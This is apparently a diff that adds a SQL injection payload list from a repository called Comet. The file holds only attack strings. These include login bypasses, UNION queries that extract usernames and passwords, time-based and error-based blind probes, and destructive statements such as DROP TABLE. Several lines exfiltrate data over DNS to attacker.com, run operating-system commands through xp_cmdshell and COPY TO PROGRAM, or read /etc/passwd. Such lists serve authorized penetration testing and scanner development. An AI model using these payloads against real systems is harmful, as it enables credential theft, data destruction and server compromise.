@@ -1,0 +1,116 @@
+# https://github.com/Zeronetsec/Comet
+
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+admin'--
+admin' #
+admin'/*
+' OR 1=1--
+" OR 1=1--
+' OR 'a'='a
+" OR "a"="a
+') OR ('a'='a
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,version(),database(),user()--
+' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
+' UNION ALL SELECT NULL,NULL,username,password FROM users--
+' UNION SELECT 1,@@version,3,4,5--
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(@@version,1,1)=5--
+' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 0,1)='a
+' AND ASCII(SUBSTR((SELECT database()),1,1))>97--
+' AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+'; WAITFOR DELAY '0:0:5'--   (MSSQL)
+' AND BENCHMARK(10000000,MD5(1))--
+' AND ExtractValue(1,concat(0x7e,(SELECT @@version),0x7e))--
+' AND UpdateXML(1,concat(0x7e,(SELECT database()),0x7e),1)--
+' OR EXP(~(SELECT * FROM (SELECT USER())x))--
+'%20OR%201=1--
+/**/OR/**/1=1--
+' OR '1'='1
+' OR 1=1%23
+' OR 'x'='x
+UNION/*foo*/SELECT/*bar*/1,2,3--
+' AND (SELECT LOAD_FILE(concat('\\\\', (SELECT database()), '.attacker.com\\')))--
+'; DROP TABLE users; --
+'; UPDATE users SET password='hacked' WHERE id=1; --
+'; INSERT INTO users (username,password) VALUES ('hacker','pwned'); --
+1;SELECT * FROM users--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' OR 1=1 UNION SELECT char(65)+char(66)+char(67),char(68)--
+' OR '1'='1' UNION SELECT UNHEX(HEX(concat(username,0x3a,password))) FROM users--
+' AND (SELECT * FROM (SELECT(SLEEP(10)))x)--
+' AND 1337=IF((SELECT COUNT(*) FROM information_schema.tables)>10,SLEEP(7),0)--
+'; IF (ASCII(SUBSTR((SELECT database()),1,1))=97) WAITFOR DELAY '0:0:7'--
+') AND ExtractValue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' UNION SELECT NULL,NULL,table_name FROM information_schema.tables--
+' UNION SELECT NULL,current_database(),current_user--
+'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com';--
+'; EXEC xp_cmdshell 'dir > C:\pwned.txt'--
+'; DECLARE @x VARCHAR(99); SET @x='ping attacker.com'; EXEC(@x);--
+1 HAVING 1=1-- 
+1 AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--
+admin' AND 1=0 UNION SELECT username, password FROM users WHERE username='admin'--
+admin' UNION SELECT 1,concat(username,':',password),3,4 FROM users--
+' OR 1=1--
+' HAVING 1=1--
+' GROUP BY 1,2,3 HAVING 1=1--
+') OR '1'='1'--
+')) OR '1'='1'--
+' OR 'x'='x
+') OR ('x'='x
+')) OR (('x'='x
+' AND 31337=31337--
+' AND 31337=31338--
+'; WAITFOR DELAY '0:0:10'--
+' AND (SELECT COUNT(*) FROM sysobjects)>0--
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CAST(DB_NAME() AS int)--
+' UNION ALL SELECT NULL-- 
+' UNION ALL SELECT NULL,NULL-- 
+' UNION ALL SELECT NULL,NULL,NULL-- 
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+' UNION ALL SELECT NULL,NULL,@@version-- 
+' UNION ALL SELECT NULL,NULL,USER-- 
+' UNION ALL SELECT NULL,NULL,DATABASE()-- 
+' UNION ALL SELECT NULL,NULL,VERSION()-- 
+' UNION ALL SELECT NULL,LOAD_FILE('/etc/passwd')-- 
+' UNION ALL SELECT NULL,NULL,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())-- 
+' UNION ALL SELECT NULL,NULL,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')-- 
+' UNION ALL SELECT NULL,NULL,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)-- 
+'+and+1=0+union+select+1,2,3--
+%27%20UNION%20SELECT%201,2,3--
+'%20OR%20'1'='1
+admin'-- 
+admin'/*
+admin' or 'a'='a'-- 
+' or 1=1#
+1' or '1'='1'--
+1 or 1=1
+1'1
+1 exec sp_ (or exec xp_)
+1 and 1=1
+1' and 1=(select count(*) from tablenames); --
+1 and user_name() = 'dbo'
+1' AND SUBSTRING(@@version,1,1) = '5
+1' AND (SELECT TOP 1 name FROM sysobjects WHERE xtype='U') LIKE '%admin%
+1;SELECT SLEEP(10)--
+1 || SLEEP(10)--
+1' OR SLEEP(10)='
+1' AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP(10))--
+1 AND (SELECT 1 FROM (SELECT SLEEP(10))A)--
+1' RLIKE (SELECT * FROM (SELECT(SLEEP(10)))A)--
+1%23
+
+# Copyright (c) 2026 Zeronetsec
